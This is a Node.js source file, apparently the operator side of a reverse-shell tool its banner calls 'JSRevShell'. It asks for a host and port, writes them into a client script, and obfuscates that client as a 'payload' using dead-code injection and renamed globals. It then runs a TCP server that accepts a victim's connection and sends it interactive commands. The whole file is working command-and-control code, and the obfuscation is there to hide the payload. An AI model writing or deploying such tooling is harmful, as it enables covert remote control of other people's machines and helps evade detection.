const Obfuscator = require('javascript-obfuscator')
const fs = require('fs')
const signale = require('signale')
const package = require('../package.json')
const { v4: uuidv4 } = require('uuid')

console.log('       _  _____ _____             _____ _          _ _ ')
console.log('      | |/ ____|  __ \\           / ____| |        | | |')
console.log('      | | (___ | |__) |_____   _| (___ | |__   ___| | |')
console.log('  _   | |\\___ \\|  _  // _ \\ \\ / /\\___ \\| \'_ \\ / _ \\ | |')
console.log(' | |__| |____) | | \\ \\  __/\\ V / ____) | | | |  __/ | |')
console.log('  \\____/|_____/|_|  \\_\\___| \\_/ |_____/|_| |_|\\___|_|_|')

const letters = 'abcdefghijklmnoprstuvwxyz'
const randomLetter = letters[Math.floor((Math.random() * letters.length))]

function genID() {
    return uuidv4().toString().replaceAll('-', '_')
}

(async () => {
    // CONFIGURATION
    const inquirer = require('inquirer')
    const ans = await inquirer.prompt([{
        type: 'confirm',
        name: 'config',
        message: 'Use config saved before?',
        default: false
    },
    {
        type: 'input',
        name: 'version',
        message: 'Payload version tag',
        default: package.version
    },
    {
        type: 'number',
        name: 'port',
        message: 'What port should payload use?',
        default: 2115
    },
    {
        type: 'input',
        name: 'host',
        message: 'host to use',
        default: '127.0.0.1'
    }
    ])

    const clientData = {
        version: ans.version,
    }

    const PORT = ans.port
    const HOST = ans.host

    // CLIENT CODE OBFUSCATION
    signale.info('Obfuscating client code')
    let code = fs.readFileSync('./shell/client.js').toString()
    let clientDataIDS = {
        version: genID(),
        c_ip: genID(),
        resF: randomLetter + genID()
    }

    if (ans.config)
        clientDataIDS = JSON.parse(fs.readFileSync('./build/keymap.json'))

    /// SET PORT AND HOST
    code = code
        .replace('\'^socket_port^\'', PORT)
        .replace('^host_ip^', HOST)
        .replace('_resF_', clientDataIDS.resF)

    // METADATA
    for (let key of Object.keys(clientDataIDS)) {
        code = code + '\n// javascript-obfuscator:disable\nconst ' + randomLetter + clientDataIDS[key] + '=\'' + clientData[key] + '\'\n'
    }

    fs.writeFileSync('./build/keymap.json', JSON.stringify(clientDataIDS))

    const clientObfuscate = Obfuscator.obfuscate(code, {
        compact: true,
        deadCodeInjection: true,
        renameGlobals: true,
    })
    fs.writeFileSync('./build/client.js', clientObfuscate.getObfuscatedCode())
    signale.success('client code obfuscated successfully')

    // SOCKET INITIALIZATION
    signale.info('Initializing sockets')
    const net = require('net')
    const readline = require('readline')
    const chalk = require('chalk')
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    })
    const prompt = (question) => {
        return new Promise((resolve, reject) => {
            rl.question(question, resolve)
        })
    }

    // COMMAND GENERATOR
    function createCommand(command, data) {
        const enc = new TextEncoder('utf-8')
        return new Uint8Array([command, ...enc.encode(data)])
    }

    // LOAD COMMANDS
    const commands = {}
    signale.info('Loading commmands')
    const path = require('path')
    for (let cmd of fs.readdirSync(path.join(__dirname, 'commands'))) {
        const cmdL = require(path.join(__dirname, 'commands', path.parse(cmd).base))
        commands[cmdL.name] = cmdL.run
    }
    signale.success('Commands loaded successfully')

    // SERVER INITIALIZATION
    let isConnected = false
    const EventEmitter = require('events').EventEmitter
    const server = net.createServer(async socket => {
        if (isConnected) {
            const sa = socket.address()
            signale.error(`${sa.address} (${sa.family}) tried to connect, but shell is already connected`)
            socket.destroy()
            return;
        }
        const sa = socket.address()
        console.log()
        signale.info(`New connection with ${sa.address} (${sa.family}) established`)
        isConnected = true;

        const events = new EventEmitter()

        // HANDLE RESPONSES
        socket.on('data', data => {
            // HANDLE RESPONSES
            events.emit('feedback', data.toString())
        })

        // HANDLE DISCONNECT
        socket.on('close', () => {
            console.log()
            signale.error(`Connection with ${sa.address} (${sa.family}) lost`)
            isConnected = false
        })

        // INITIALIZE METHODS
        const UglifyJS = require('uglify-js')
        const methods = {
            send: (command, data) => socket.write(createCommand(command, data)),
            feedback: (args) => `((...data) => ${clientDataIDS.resF}(data.join(', ')))(${args})`,
            events: events,
            waitFor: (event, timeout) => new Promise((resolve, reject) => { events.once(event, resolve); setTimeout(reject, timeout) }),
            clientResponse: (timeout) => methods.waitFor('feedback', timeout || 5000).catch(e => signale.error('Client response timeout')),
            code: (code) => UglifyJS.minify(code, {
                compress: {
                    dead_code: true
                }
            }).code
        }

        // HANDLE COMMANDS
        while (isConnected) {
            const command = await prompt(chalk.green(sa.address) + ' >> ')

            const cmd = command.split(' ')[0]
            const args = command.split(' ').slice(1)

            if (!Object.keys(commands).includes(cmd)) {
                signale.error('Command ' + cmd + ' not found')
                continue
            }

            await commands[cmd](methods, args)
        }
    }).listen(PORT)

    signale.success('Awaiting connections')

})()